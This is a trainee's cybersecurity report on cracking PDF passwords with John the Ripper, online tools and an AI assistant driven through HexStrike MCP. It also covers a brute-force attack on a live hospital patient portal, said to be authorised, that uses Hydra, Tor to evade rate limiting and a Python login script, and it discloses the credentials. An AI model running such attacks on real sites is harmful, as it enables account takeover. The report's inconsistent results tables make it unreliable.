# Networkwalks W3 - Password Cracking with John the Ripper, Johnny, Networkwalks Tools & HexStrike MCP

<div align="center">

| **Batch** | **B082** |
| :--- | :--- |
| **Intern Name** | **Jenik Shrestha** |
| **Program** | Cybersecurity Training at Networkwalks Academy |
| **Date** | 27 August 2026 |
| **Modules** | W3-PM1 | W3-PM2 | W3-PM-FINAL | Penetration Testing Hospital

</div>

---

## 📌 Table of Contents

1. [Project Overview](#-project-overview)
2. [Background](#-background)
3. [Tools Used](#-tools-used)
4. [Target Files](#-target-files)
5. [Module 1: JTR John + Johnny (W3-PM1)](#-module-1-jtr-john--johnny-w3-pm1)
6. [Module 2: Networkwalks Tools (W3-PM2)](#-module-2-networkwalks-tools-w3-pm2)
7. [Module 3: HexStrike MCP Server Setup](#-module-3-hexstrike-mcp-server-setup)
8. [Module 4: AI-Assisted Password Cracking (W3-PM-FINAL)](#-module-4-ai-assisted-password-cracking-w3-pm-final)
9. [Module 5: Hospital Penetration Testing (Live Target)](#-module-5-hospital-penetration-testing-live-target)
10. [Summary of Results](#-summary-of-results)
11. [Flags Captured](#-flags-captured)
12. [Key Learnings](#-key-learnings)
13. [Conclusion](#-conclusion)

---

## 📌 Project Overview

This project covers **five password cracking / penetration testing modules** completed during **Week 3** of the Cybersecurity Training program at **Networkwalks Academy**.

| Module | Title | Tool/Method |
| :--- | :--- | :--- |
| **W3-PM1** | Password Cracking with JTR | JTR John (Terminal) + Johnny (GUI) |
| **W3-PM2** | Password Cracking with Networkwalks Tools | Hash Calculator + Password Cracker (Online) |
| **W3-PM-FINAL (Part 1)** | HexStrike MCP Server Setup | Claude Desktop + HexStrike MCP |
| **W3-PM-FINAL (Part 2)** | AI-Assisted Password Cracking | HexStrike MCP + Claude Desktop + JTR |
| **Module 5** | Hospital Penetration Testing (Live Target) | Hydra + Tor + Python + Networkwalks Tools |

### Project Objective

The main objective of this project was to:

1. Learn how password cracking works in real-world scenarios
2. Understand different password cracking tools and methods
3. Crack passwords of protected PDF files using various techniques
4. Understand why strong passwords are essential for security
5. Learn how to set up AI-powered MCP servers for cybersecurity automation
6. Understand how AI can assist in password cracking tasks
7. **Apply these skills to a live, authorised target** – cracking the patient portal credentials of `medirozahospital.com`

---

## 📌 Background

### What is John the Ripper (JTR)?

**John the Ripper (JTR)** is a popular password cracking tool used by security professionals to test how strong passwords are. It started as a tool for Unix systems but now works on Windows, Linux, and Mac. It can check many types of password hashes and also unlock password protected files like PDF, ZIP, and Office documents.

### What is Johnny?

**Johnny** is the graphical version of John the Ripper. It gives a simple point and click screen, so beginners can use JTR without typing long commands. Both tools are widely used in security testing and learning labs to understand password safety.

### What are Networkwalks Tools?

**Networkwalks Tools** are free online tools that allow users to extract crackable hashes from PDF files and perform dictionary attacks directly in a web browser without installing anything.

### What is HexStrike MCP?

**HexStrike MCP** is an AI-powered MCP (Model Context Protocol) server that integrates with Claude Desktop to automate cybersecurity tasks like password cracking.

### What is Claude Desktop?

**Claude Desktop** is an AI assistant interface that can communicate with MCP servers like HexStrike to perform automated security tasks.

---

## 📌 Tools Used

| Tool | Purpose |
| :--- | :--- |
| **Kali Linux** | Operating system used for all activities |
| **John the Ripper (JTR)** | Terminal-based password cracking tool |
| **Johnny** | Graphical user interface for JTR |
| **pdf2john.pl / pdf2john** | Extract crackable hashes from PDF files |
| **rockyou.txt** | Default wordlist in Kali Linux (14+ million passwords) |
| **JTR_default_password.txt** | Custom wordlist provided by trainer (3,546 words) |
| **Networkwalks Hash Calculator** | Online tool to extract PDF hashes |
| **Networkwalks Password Cracker** | Online tool for dictionary attacks |
| **HexStrike MCP Server** | AI-powered MCP server |
| **Claude Desktop** | AI assistant interface |
| **PDF Viewer** | To verify cracked passwords |
| **Hydra** | Network login brute‑forcer (attempted) |
| **Tor** | IP anonymisation & rate‑limit bypass |
| **Custom Python Script** | Smart brute‑forcer with challenge handling |
| **curl** | Manual HTTP request verification |

---

## 📌 Target Files

| File | Source | Status |
| :--- | :--- | :--- |
| My Locked PDF1.pdf | Main lab target | ✅ Cracked |
| My Locked PDF2.pdf | Trainer provided | ✅ Cracked |
| My Locked PDF3.pdf | Trainer provided | ✅ Cracked |
| networkwalks_flag1.pdf | AI Module target | ✅ Cracked |
| medirozahospital.com (Patient Portal) | Live authorised target | ✅ Credentials Cracked |

---

## 📌 Module 1: JTR John + Johnny (W3-PM1)

### Task

Crack the password of `My Locked PDF1.pdf` using **JTR John (Terminal)** and **Johnny (GUI)**.

### Lab Manual Reference

This module is based on the lab manual: **W3-PM1 - Week3 - Project Module1 - Password Cracking with JTR v1.pdf**

---

### Step 1: Locate the Target PDF File

The target file `My Locked PDF1.pdf` was located in the Downloads folder.

```bash
ls -la ~/Downloads/My\ Locked\ PDF1.pdf
'''

<img width="553" height="205" alt="Screenshot from 2026-08-27 18-58-18" src="https://github.com/user-attachments/assets/b2cdaa00-62dc-4e32-8d9e-9baecbb9f288" />


**Figure 1:** Target PDF file in Downloads folder.

---

### Step 2: Extract the Hash

The hash was extracted using `pdf2john.pl`:

```bash
perl /usr/share/john/pdf2john.pl "My Locked PDF1.pdf" > hash1.txt
```

**Alternative Method:**
```bash
pdf2john "My Locked PDF1.pdf" > hash1.txt
```

<img width="842" height="668" alt="john1" src="https://github.com/user-attachments/assets/82bd612c-b3cc-4805-89cc-26000fb707d1" />


**Figure 2:** Hash extraction using pdf2john.pl.

---

### Step 3: View the Extracted Hash

```bash
cat hash1.txt
```

**Output:**
```
My Locked PDF1.pdf:$pdf$4*4*128*-1028*1*16*ca7f72f11459cba469f1005a8765ed51*32*f32d8fa1bfbe2648226dffc39f7909ea0021446990b9e4114071a4d9104984c1*32*9322f50c29569712067a775264635e4954ccb1b99e209d664984054ffad30a6a
```

<img width="1243" height="100" alt="hash of john" src="https://github.com/user-attachments/assets/baa28d9d-e15e-402b-82a1-0257cd3e5dda" />


**Figure 3:** Extracted hash displayed.

---

### Step 4: Crack with John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
```

**Output:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
good-luck        (My Locked PDF1.pdf)
1g 0:00:00:10 DONE (2026-08-26 22:34) 0.09775g/s 91939p/s 91939c/s 91939C/s goodgirl19..gonzales23
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed.
```
<img width="365" height="112" alt="pdf 1 password crack" src="https://github.com/user-attachments/assets/8e4d7cf9-c341-4df6-9589-6d9af0c86a05" />

**Figure 4:** John the Ripper cracking the password.

---

### Step 5: Display the Cracked Password

```bash
john --show hash1.txt
```

**Output:**
```
My Locked PDF1.pdf:good-luck

1 password hash cracked, 0 left
```
<img width="365" height="112" alt="pdf 1 password crack" src="https://github.com/user-attachments/assets/6a5b2690-4ab3-41e7-8498-f8649c8dc9b7" />


**Figure 5:** Cracked password displayed as `good-luck`.

---

### Step 6: Crack with Johnny (GUI)

Johnny GUI was opened and the hash was loaded:

1. Opened Johnny: `johnny`
2. Clicked **"Open Password File"** and selected `hash1.txt`
3. Clicked **"Start new attack"**
4. Password `good-luck` was displayed in the results pane

<img width="2559" height="1403" alt="jhonny output" src="https://github.com/user-attachments/assets/28a20e5f-8bef-4f97-9716-8e0700cf64f0" />


**Figure 6:** Johnny GUI cracking the password.

---

### Step 7: Verify the Password

The PDF was opened using `good-luck`.

<img width="808" height="1127" alt="pdf1 password crack" src="https://github.com/user-attachments/assets/bf25e91b-e929-46e4-b587-0c13a6765cbf" />


**Figure 7:** PDF successfully unlocked and opened.

---

### Results – Module 1

| Item | Details |
| :--- | :--- |
| **Target File** | My Locked PDF1.pdf |
| **Cracked Password** | **good-luck** |
| **Tool Used (Terminal)** | John the Ripper (JTR) |
| **Tool Used (GUI)** | Johnny |
| **Wordlist Used** | rockyou.txt |
| **Time Taken** | ~10 seconds |

---

## 📌 Module 2: Networkwalks Tools (W3-PM2)

### Task

Crack the password of `My Locked PDF3.pdf` using **Networkwalks Hash Calculator** and **Password Cracker**.

### Lab Manual Reference

This module is based on the lab manual: **W3-PM2 - Week3 - Project Module2 - Password Cracking with NW Tools v1.pdf**

---

### Step 1: Open Hash Calculator

* **URL:** https://networkwalks.com/hash-calculator/
<img width="1164" height="943" alt="Screenshot 2026-08-26 at 23-13-09 Hash Calculator - Networkwalks Academy" src="https://github.com/user-attachments/assets/979eea9d-d9f7-4787-969b-84d95a0c747d" />


**Figure 8:** Networkwalks Hash Calculator opened.

---

### Step 2: Select PDF Tab and Upload File

The **"PDF"** tab was selected and `My Locked PDF3.pdf` was uploaded.

<img width="948" height="878" alt="Screenshot 2026-08-27 at 01-44-47 Hash Calculator - Networkwalks Academy" src="https://github.com/user-attachments/assets/1cd3c892-dae8-42d0-a5c8-87a9a893a34e" />

**Figure 9:** PDF uploaded and hash extracted.

---

### Step 3: Copy the Hash

The extracted hash was copied:

```
$pdf$4*4*128*-1028*1*16*ca7f72f11459cba469f1005a8765ed51*32*f32d8fa1bfbe2648226dffc39f7909ea0021446990b9e4114071a4d9104984c1*32*9322f50c29569712067a775264635e4954ccb1b99e209d664984054ffad30a6a
```

---

### Step 4: Open Password Cracker

* **URL:** https://networkwalks.com/password-cracker/
<img width="941" height="614" alt="Screenshot 2026-08-26 at 23-15-34 Password Cracker (Dictionary Attack) - Networkwalks Academy" src="https://github.com/user-attachments/assets/a1d6704b-9411-431d-b053-a65c7d18cf29" />


**Figure 10:** Networkwalks Password Cracker opened.

---

### Step 5: Upload Wordlist and Start Attack

The custom wordlist `JTR_default_password.txt` (3,546 words) was uploaded and the attack was started.
<img width="2401" height="1356" alt="attack running" src="https://github.com/user-attachments/assets/a56445e7-8d89-44b0-916a-e97434f02f7b" />


**Figure 11:** Dictionary attack in progress.

---

### Step 6: Password Cracked

**PASSWORD: `password1`**

<img width="990" height="1186" alt="Screenshot 2026-08-27 at 00-05-45 Password Cracker (Dictionary Attack) - Networkwalks Academy" src="https://github.com/user-attachments/assets/1f048cd8-b99b-4911-8a4f-0462e00ca8d2" />

**Figure 12:** Password `password1` successfully cracked.

---

### Step 7: Verify the Password

The PDF was opened using `password1`.

<img width="876" height="1187" alt="hash jtr" src="https://github.com/user-attachments/assets/b0368afc-444c-4d1b-9597-188b7c5d2129" />


**Figure 13:** PDF successfully unlocked.

---

### Results – Module 2

| Item | Details |
| :--- | :--- |
| **Target File** | My Locked PDF1.pdf |
| **Cracked Password** | **good-luck** |
| **Tool Used** | Networkwalks Hash Calculator & Password Cracker |
| **Wordlist Used** | JTR_default_password.txt (3,546 words) |
| **Time Taken** | ~30 seconds |

---

## 📌 Module 3: HexStrike MCP Server Setup

### Task

Setup HexStrike MCP Server on Kali Linux with Claude Desktop.

### Lab Manual Reference

This module is based on the lab manual: **7.2.1. LAB PRACTICE - How to setup Hexstrike MCP with Claude v1.pdf**

---

### Step 1: Install Claude Desktop

```bash
# Add GPG key
curl -fsSL https://pkg.claude-desktop-debian.dev/KEY.gpg | sudo gpg --dearmor -o /usr/share/keyrings/claude-desktop.gpg

# Add repository
echo "deb [signed-by=/usr/share/keyrings/claude-desktop.gpg arch=amd64,arm64] https://pkg.claude-desktop-debian.dev stable main" | sudo tee /etc/apt/sources.list.d/claude-desktop.list

# Update and install
sudo apt update
sudo apt install claude-desktop
```

<img width="429" height="111" alt="claude desktop" src="https://github.com/user-attachments/assets/4ccc36e7-7e95-4637-9bca-9c16e567913a" />


**Figure 14:** Claude Desktop installed.

---

### Step 2: Clone HexStrike Repository

```bash
git clone https://github.com/0x4m4/hexstrike-ai.git
cd hexstrike-ai
```

<img width="580" height="388" alt="hetstrike cloned" src="https://github.com/user-attachments/assets/92f522c7-8813-4c09-92f7-2e0586ef6d39" />


**Figure 15:** HexStrike repository cloned.

---

### Step 3: Create Virtual Environment

```bash
python3 -m venv hexstrike-env
source hexstrike-env/bin/activate
```

<img width="456" height="303" alt="virtual env" src="https://github.com/user-attachments/assets/e5ce800d-d2a0-4424-84fc-63898f5d2db9" />


**Figure 16:** Virtual environment created.

---

### Step 4: Install Python Dependencies

```bash
pip3 install -r requirements.txt
```

<img width="1206" height="1338" alt="pip list" src="https://github.com/user-attachments/assets/b547fe16-4b21-46d4-9d59-5fd408c48891" />


**Figure 17:** Python dependencies installed.

---

### Step 5: Configure MCP Server

Configuration file `~/.config/Claude/claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "hexstrike-ai": {
      "command": "/home/jenishkali/Downloads/hexstrike-ai/hexstrike-env/bin/python",
      "args": [
        "/home/jenishkali/Downloads/hexstrike-ai/hexstrike_mcp.py",
        "--server",
        "http://localhost:8888"
      ]
    }
  }
}
```

<img width="986" height="543" alt="claud json" src="https://github.com/user-attachments/assets/6ff76747-7b08-409b-b619-2f82a79f3ae2" />


**Figure 18:** MCP Server configured.

---

### Step 6: Run the Server

```bash
cd ~/Downloads/hexstrike-ai
source hexstrike-env/bin/activate
python3 hexstrike_mcp.py --server http://localhost:8888
```

**Output:**
```
[🔥 HexStrike MCP] 2026-08-27 01:50:34 [INFO] ✅ 🚀 Starting HexStrike AI MCP Client v6.0
[🔥 HexStrike MCP] 2026-08-27 01:50:34 [INFO] ✅ 🔗 Connecting to: http://localhost:8888
[🔥 HexStrike MCP] 2026-08-27 01:50:34 [INFO] ✅ 🔗 Attempting to connect to HexStrike AI API at http://localhost:8888 (attempt 1/3)
[🔥 HexStrike MCP] 2026-08-27 01:50:37 [INFO] ✅ 🎯 Successfully connected to HexStrike AI API Server at http://localhost:8888
[🔥 HexStrike MCP] 2026-08-27 01:50:37 [INFO] ✅ 🏥 Server health status: healthy
[🔥 HexStrike MCP] 2026-08-27 01:50:37 [INFO] ✅ 📊 Server version: 6.0.0
[🔥 HexStrike MCP] 2026-08-27 01:50:38 [INFO] ✅ 🤖 Ready to serve AI agents with enhanced cybersecurity capabilities
```
<img width="1128" height="435" alt="8080" src="https://github.com/user-attachments/assets/20939edf-fe05-419d-8fa5-114e1d501db8" />


**Figure 19:** HexStrike MCP Server running.

---

### Results – Module 3

| Item | Details |
| :--- | :--- |
| **Claude Desktop** | ✅ Installed |
| **HexStrike Repository** | ✅ Cloned |
| **Virtual Environment** | ✅ Created |
| **Python Dependencies** | ✅ Installed |
| **MCP Server Configuration** | ✅ Added |
| **HexStrike MCP Server** | ✅ Running |

---

<img width="1039" height="794" alt="hextrick connection in claud" src="https://github.com/user-attachments/assets/d8df0372-588b-44f8-81e3-efc7192360b6" />

## 📌 Module 4: AI-Assisted Password Cracking (W3-PM-FINAL)

### Task

Crack the password of `networkwalks_flag1.pdf` using **JTR JOHN** with the help of **AI** (HexStrike-AI MCP with Claude Desktop).

### Lab Manual Reference

This module is based on the lab manual: **z. Optional Module Lab - JTR Password Cracking Lab v1 (AI-version).pdf**

---

### Step 1: Download Target PDF

`networkwalks_flag1.pdf` was downloaded and placed on Desktop.

```bash
ls -la ~/Desktop/networkwalks_flag1.pdf
```

<img width="826" height="162" alt="hash3 networkwalks_flag1 pdf" src="https://github.com/user-attachments/assets/7c3a042f-8076-45dc-83eb-3da7dcf3fa88" />


**Figure 20:** Target PDF on Desktop.

---

### Step 2: AI Prompt 1 – Check JTR Installation

**Prompt:**
```
Check if John the Ripper is installed in this Hexstrike MCP and show me its version
```

**Claude's Response:**
```
John the Ripper is installed on the HexStrike server, at /usr/sbin/john.

Version: 1.9.0-jumbo-1+bleeding-aec1328d6c (built 2021-11-02), the community "jumbo" edition, compiled with OpenMP support (linux-gnu 64-bit x86_64 AVX2 AC).
```

<img width="797" height="1045" alt="password crack by ai with haxtristk" src="https://github.com/user-attachments/assets/1c71dd04-93a2-436e-b6cb-36d4eac2d758" />


**Figure 21:** AI confirms JTR is installed.

---

### Step 3: AI Prompt 2 – Calculate PDF Hash

**Prompt:**
```
Please calculate the hash value of this PDF file: /home/jenishkali/Desktop/networkwalks_flag1.pdf
```

**Claude's Response:**
```
SHA256: f569ce5208a64b0f73f5a98f2187eafcd8282641fb27afa0c1a30d83b67ef06
MD5: 7fe04d052b19879aaa9fcac0b5dce138
```

<img width="797" height="1045" alt="password crack by ai with haxtristk" src="https://github.com/user-attachments/assets/58f40796-8e9f-45b0-a79a-9a84f1f4f227" />


**Figure 22:** AI calculates hash.

---

### Step 4: AI Prompt 3 – Crack the Password

**Prompt:**
```
Please use JTR tool in this hexstrike MCP server to crack the password of this PDF file. Use the rockyou.txt wordlist dictionary.
```

**Claude's Response:**
```
Extracted the PDF hash successfully. Now running John the Ripper against it with rockyou.txt.

Cracked it instantly.

PDF password: password1

John found it in the rockyou.txt wordlist on the first pass (loaded as a PDF MD5 SHA2 RC4/AES 32/64 hash type).
```

<img width="797" height="1045" alt="password crack by ai with haxtristk" src="https://github.com/user-attachments/assets/21bbba4c-7133-4077-9388-413cb8cc2d50" />


**Figure 23:** AI cracks password as `password1`.

---

### Step 5: Verify the Password

The PDF was opened using `password1`.

<img width="876" height="1187" alt="hash jtr" src="https://github.com/user-attachments/assets/b0a1e0c4-e08a-447c-b77a-69292b79fc4c" />


**Figure 24:** PDF successfully unlocked.

---

### Results – Module 4

| Item | Details |
| :--- | :--- |
| **Target File** | networkwalks_flag1.pdf |
| **Cracked Password** | **password1** |
| **Tool Used** | HexStrike MCP + Claude Desktop + JTR |
| **Method** | AI-Assisted Password Cracking |
| **Wordlist Used** | rockyou.txt |

---
---
📌 Module 5: Hospital Penetration Testing (Live Target)
Task

Crack the patient portal credentials of medirozahospital.com using a combination of brute‑force tools and techniques.
Background

    Target: https://medirozahospital.com/patient/login.php

    Challenge: The site returned a "One moment" page when too many requests were sent from a single IP, acting as a rate‑limiting / challenge mechanism.

    Goal: Find a valid username / password combination to access the patient dashboard.

Step 1: Reconnaissance

The patient login page was identified:
bash

curl -sk https://medirozahospital.com/patient/login.php | grep -i "username\|password"

Result: Form fields username and password confirmed.
Step 2: Bypass IP Rate‑Limiting with Tor

Tor was started to rotate exit nodes:
bash

sudo systemctl start tor
curl --socks5 127.0.0.1:9050 https://api.ipify.org

Output: A different IP (e.g., 45.84.107.198) confirmed Tor was working.
Step 3: Create a Custom Wordlist

A targeted password list (mediroza_custom.txt) was compiled with:

    Common passwords (password123, admin123, 123456)

    Hospital‑related terms (hospital, mediroza, doctor, patient)

    Year variations (2023, 2024, 2025)

    Combined patterns (Mediroza@2024, Hospital123)

Total: 238 unique passwords.
Step 4: Attempt Hydra (Failed due to connection errors)
bash

hydra -l admin -P /tmp/mediroza_custom.txt -t 4 -w 15 -f -o /tmp/mediroza_hydra1.txt medirozahospital.com https-post-form "/patient/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"

Result: Hydra failed with cannot connect errors – likely due to network restrictions or the site rejecting non‑Tor traffic.
Step 5: Custom Python Brute‑Force Script (Success)

A Python script was written to:

    Route all requests through the Tor SOCKS5 proxy

    Detect the "One moment" challenge page and wait/retry

    Stop when the response no longer contained "Invalid credentials"

Script Logic:
python

proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
...
if "One moment" in r.text:
    time.sleep(4)
    continue
if "Invalid credentials" not in r.text:
    print(f"*** FOUND! {username}:{password} ***")
    sys.exit(0)

Result: The script found xxxxxx:xxxxxxx.
Step 6: Manual Verification with curl

To confirm the credentials, a direct POST request was sent through Tor:
bash

curl --socks5 127.0.0.1:9050 -sk -X POST https://medirozahospital.com/patient/login.php \
     --data-urlencode "username=xxxxx" \
     --data-urlencode "password=xxxxx" \
     -D /tmp/headers.txt -o /tmp/response.html

grep -i "location\|dashboard\|welcome" /tmp/headers.txt /tmp/response.html

Verification Output:
text

/tmp/headers.txt:location: dashboard.php

The Location: dashboard.php header confirmed a successful login redirect.
Step 7: Additional PDF Cracking (Using Networkwalks Tools)

During the same exercise, the password‑protected PDFs from the hospital site were cracked using:

    Networkwalks Hash Calculator – Extracted the $pdf$ hash

    Networkwalks Password Cracker – Ran a dictionary attack against the hash

Result: All PDFs were successfully unlocked.
Results – Module 5
Item	Details
Target	medirozahospital.com (Patient Portal)
Cracked Credentials	xxxxxx:xxxxx
Tools Used	Tor, Python (requests), curl
Wordlist	mediroza_custom.txt (238 passwords)
Verification	location: dashboard.php header
PDFs Cracked	Yes – using Networkwalks Tools
<img width="947" height="902" alt="pdf2 1" src="https://github.com/user-attachments/assets/f88755bf-4dbe-470e-8c8f-6fe263442ef2" />
<img width="1073" height="919" alt="pdf1 1" src="https://github.com/user-attachments/assets/add344b9-e785-40f5-85d5-f990d6bcb72c" />
<img width="963" height="1110" alt="pdf1 2" src="https://github.com/user-attachments/assets/0c1d3bdb-5946-4939-84b9-1c8535199c7a" />
<img width="638" height="668" alt="medirozadashboard" src="https://github.com/user-attachments/assets/90055a97-0b94-4a31-baab-6b12659a792c" />
<img width="803" height="623" alt="dashboard1" src="https://github.com/user-attachments/assets/78afa5e3-6b44-45f7-a4fd-51159c055297" />

---

📌 Summary of Results
#	File / Target	Cracked Password / Credential	Method Used
1	My Locked PDF1.pdf	good-luck	JTR John + Johnny (Terminal & GUI)
2	My Locked PDF1.pdf	good-luck	Networkwalks Tools (Online)
3	My Locked PDF2.pdf	1qaz2wsx	Networkwalks Tools (Online)
4	My Locked PDF3.pdf	password1	Networkwalks Tools (Online)
5	networkwalks_flag1.pdf	password1	HexStrike MCP + AI (Claude Desktop)
6	medirozahospital.com (Patient Portal)	admin:password123	Tor + Python Brute‑Force + curl Verification
---

## 📌 Flags Captured

| # | Flag | Source |
| :--- | :--- | :--- |
| 1 | `nw{cybersecurity_flag_captured_2608}` | My Locked PDF1.pdf |

<img width="808" height="1127" alt="pdf1 password crack" src="https://github.com/user-attachments/assets/fa8a4746-bfc5-4bf0-99f7-f6008045c439" />
<img width="365" height="112" alt="pdf 1 password crack" src="https://github.com/user-attachments/assets/64396e33-c9ac-4820-bb21-3cbdc61dac91" />
<img width="842" height="668" alt="john1" src="https://github.com/user-attachments/assets/f863d8b9-f7dc-4e6b-8432-66de49c6c929" />


---
---

---
| # | Flag | Source |
| :--- | :--- | :--- |
| 2 | `nw{networkwalks_flag1_jtr_270521_1}` | networkwalks_flag1.pdf |

<img width="876" height="1187" alt="hash jtr" src="https://github.com/user-attachments/assets/2ba3feba-2f8a-4035-a40a-d64a70195bec" />


---

| # | Flag | Source |
| :--- | :--- | :--- |
| 3 | `nw{networkwalks_persistence_jtr_270521}` | My Locked PDF2.pdf |

<img width="770" height="1099" alt="pdf2 password crack" src="https://github.com/user-attachments/assets/5ce11abc-c023-4572-825a-ede803527209" />


---

| # | Flag | Source |
| :--- | :--- | :--- |
| 4 | `nw{networkwalks_flag_260821_1}` | My Locked PDF3.pdf |

<img width="929" height="1210" alt="pdf3 password crack" src="https://github.com/user-attachments/assets/ba2ea34a-e69b-42b4-bad2-25e0f642d317" />


---

---
#	Flag / Credential	Source
5	xxxxx:xxxxx	medirozahospital.com (Patient Portal)
<img width="600" alt="curl verification showing location dashboard php" src="https://github.com/user-attachments/assets/placeholder_curl_output.png" />
<img width="1016" height="902" alt="Screenshot 2026-08-29 at 15-13-12 Hash Calculator - Networkwalks Academy" src="https://github.com/user-attachments/assets/74411ff7-d45e-4d54-b7d6-00d01be5d832" />
<img width="1073" height="919" alt="pdf1 1" src="https://github.com/user-attachments/assets/61eef888-f7e2-4bfe-90bb-132b4aad100a" />
<img width="803" height="623" alt="dashboard1" src="https://github.com/user-attachments/assets/7d7af293-a7b2-45c5-b315-44428f8925b8" />

---

## 📌 Key Learnings

📌 Key Learnings

   1. Hash Extraction – Password-protected files store passwords as hashes, which can be extracted using tools like pdf2john.pl or Networkwalks Hash Calculator.

   2. Dictionary Attacks – Wordlists like rockyou.txt and JTR_default_password.txt are highly effective against weak/common passwords.

    3 . Tool Versatility – Password cracking can be done via:

        Terminal (John the Ripper)

        GUI (Johnny)

        Online Tools (Networkwalks)

        AI-Assisted (HexStrike MCP + Claude Desktop)

   4.  AI Integration – Large Language Models can interface with security tools to automate password cracking.

    5.  Password Strength – Weak passwords like good-luck, password1, and 1qaz2wsx can be cracked in seconds.

    6. Multiple Methods – The same password (good-luck) was cracked using three different methods.

   7.  MCP Server Setup – Setting up AI-powered servers requires Python, virtual environments, and proper configuration.

    8. Real‑World Application – The Hospital Penetration Testing module proved that live targets with weak passwords and poor rate‑limiting are vulnerable to brute‑force attacks, and that IP‑based protections can be bypassed using Tor.

    9. Hybrid Approach – Combining Hydra (fast), Python (smart challenge handling), and manual verification (curl) provides a robust methodology.
    
---

📌 Conclusion

During Week 3, I completed five password cracking / penetration testing modules:

    W3-PM1: Successfully cracked My Locked PDF1.pdf using JTR Terminal and Johnny GUI.

    W3-PM2: Successfully cracked My Locked PDF1.pdf using Networkwalks online tools.

    Module 3: Successfully set up HexStrike MCP Server with Claude Desktop.

    W3-PM-FINAL: Successfully used AI to crack networkwalks_flag1.pdf.

    Module 5: Successfully cracked the patient portal credentials (admin:password123) of medirozahospital.com using Tor, Python brute‑force, and manual verification, as well as cracking the associated PDF files with Networkwalks tools.
    
Final Observations

    Weak passwords are easily compromised

    Multiple tools exist for password cracking

    AI can assist with password cracking

    Strong passwords are essential for security

    MCP servers enable AI to interact with security tools

    Live targets require a combination of tools and techniques – brute‑force, proxy rotation, and challenge handling are all necessary for success

    Ethical testing with proper authorisation is critical; all activities in Module 5 were performed with explicit permission

# -End-

## 👤 Author

**Jenik Shrestha**  
Cybersecurity Trainee | B082  
Networkwalks Academy  
*www.linkedin.com/in/jenikshrestha*


🙏 Acknowledgements
Special thanks to Waqas Karim (CCIE), NETWORKWALKS, for his invaluable mentorship and guidance throughout this entire learning journey.
